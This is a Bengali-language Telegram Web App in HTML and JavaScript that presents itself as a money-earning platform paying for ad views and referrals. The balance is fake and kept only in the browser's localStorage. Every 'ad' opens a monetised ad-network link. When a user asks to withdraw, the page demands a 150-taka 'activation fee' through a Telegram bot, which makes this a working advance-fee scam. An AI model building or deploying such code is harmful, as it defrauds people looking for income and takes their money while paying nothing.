<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>টাকা ইনকাম সেন্টার - প্রফেশনাল</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary: #2563eb; --secondary: #10b981; --bg: #f8fafc; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); margin: 0; padding: 15px; padding-bottom: 100px; color: #333; }
        .page { display: none; }
        .page.active { display: block; }
        .balance-card { background: linear-gradient(135deg, #2563eb, #1d4ed8); color: white; border-radius: 24px; padding: 30px; text-align: center; margin-bottom: 20px; }
        .balance-amount { font-size: 40px; font-weight: bold; }
        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 15px; }
        .btn { background: var(--primary); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-success { background: var(--secondary); }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: white; display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid #eee; z-index: 1000; }
        .ad-modal { display: none; position: fixed; top:0; left:0; right:0; bottom:0; background: rgba(0,0,0,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; color: white; padding: 20px; }
        .timer-circle { font-size: 50px; font-weight: bold; color: #38bdf8; margin: 20px 0; }
        .history-item { border-bottom: 1px solid #eee; padding: 10px 0; display: flex; justify-content: space-between; }
    </style>
</head>
<body>

    <div id="page-home" class="page active">
        <div class="balance-card">
            <p>মোট ব্যালেন্স</p>
            <div class="balance-amount" id="main-balance">৳ 0.00</div>
        </div>
        <div class="card">
            <h3>📢 নোটিশ বোর্ড</h3>
            <p id="notice-text">নতুন ইউজারদের জন্য বোনাস অফার চলছে!</p>
        </div>
    </div>

    <div id="page-work" class="page">
        <div class="card">
            <h3>📺 ভিডিও টাস্ক</h3>
            <p>প্রতি ভিডিওতে ১০ টাকা। প্রতিদিন ৩০টি টাস্ক।</p>
            <button class="btn" onclick="watchAd()">বিজ্ঞাপন দেখুন</button>
        </div>
        <div class="card">
            <h3>👥 রেফারাল প্রোগ্রাম</h3>
            <p>প্রতি রেফারে ১১১ টাকা।</p>
            <button class="btn btn-success" onclick="copyRefer()">রেফার লিংক কপি</button>
        </div>
    </div>

    <div id="page-wallet" class="page">
        <div class="card">
            <h3>💳 পেমেন্ট নিন</h3>
            <input type="text" class="input-field" id="w-num" placeholder="মোবাইল নাম্বার" style="width:100%; padding:10px; margin:5px 0;">
            <input type="number" class="input-field" id="w-amt" placeholder="পরিমাণ (৫০০+)" style="width:100%; padding:10px; margin:5px 0;">
            <button class="btn btn-success" onclick="requestWithdraw()">অনুরোধ পাঠান</button>
        </div>
        <div class="card">
            <h3>📜 উত্তোলনের ইতিহাস</h3>
            <div id="withdraw-history"></div>
        </div>
    </div>

    <div id="adModal" class="ad-modal">
        <h2>বিজ্ঞাপন চলছে...</h2>
        <div class="timer-circle" id="timer">15</div>
        <button id="closeBtn" class="btn" style="display:none; width: 200px;" onclick="claimReward()">টাকা সংগ্রহ করুন</button>
    </div>

    <div class="nav-bar">
        <div onclick="switchPage('home', this)">🏠 হোম</div>
        <div onclick="switchPage('work', this)">📋 কাজ</div>
        <div onclick="switchPage('wallet', this)">💳 ওয়ালেট</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        const userId = tg.initDataUnsafe?.user?.id || 'guest_' + Math.floor(Math.random()*9999);
        
        let state = {
            bal: parseFloat(localStorage.getItem('bal_'+userId)) || 0,
            tasks: parseInt(localStorage.getItem('tasks_'+userId)) || 0,
            history: JSON.parse(localStorage.getItem('hist_'+userId)) || []
        };

        function updateUI() {
            document.getElementById('main-balance').innerText = '৳ ' + state.bal.toFixed(2);
            document.getElementById('wallet-balance') ? document.getElementById('wallet-balance').innerText = state.bal.toFixed(2) : null;
            localStorage.setItem('bal_'+userId, state.bal);
            localStorage.setItem('tasks_'+userId, state.tasks);
        }

        function switchPage(id, el) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page-'+id).classList.add('active');
        }

        function watchAd() {
            document.getElementById('adModal').style.display = 'flex';
            let t = 15;
            let interval = setInterval(() => {
                t--;
                document.getElementById('timer').innerText = t;
                if(t <= 0) { clearInterval(interval); document.getElementById('closeBtn').style.display = 'block'; }
            }, 1000);
            window.open("https://www.effectivecpmnetwork.com/yhhcrkxvyn?key=bc517386f86c6bf30508cdb97a797752", '_blank');
        }

        function claimReward() {
            state.bal += 10;
            state.tasks++;
            updateUI();
            document.getElementById('adModal').style.display = 'none';
            document.getElementById('closeBtn').style.display = 'none';
        }

        function requestWithdraw() {
            const amt = parseFloat(document.getElementById('w-amt').value);
            if(amt < 500) { tg.showAlert("ন্যূনতম ৫০০ টাকা!"); return; }
            
            tg.showPopup({
                title: 'অ্যাকাউন্ট অ্যাক্টিভ করুন',
                message: 'উত্তোলন কনফার্ম করতে ১৫০ টাকা অ্যাক্টিভেশন ফি প্রদান করুন।',
                buttons: [{id: 'pay', type: 'default', text: 'পেমেন্ট করুন'}]
            }, (btn) => { if(btn === 'pay') tg.openLink("https://t.me/ks162699bot"); });
        }

        updateUI();
    </script>
</body>
</html>
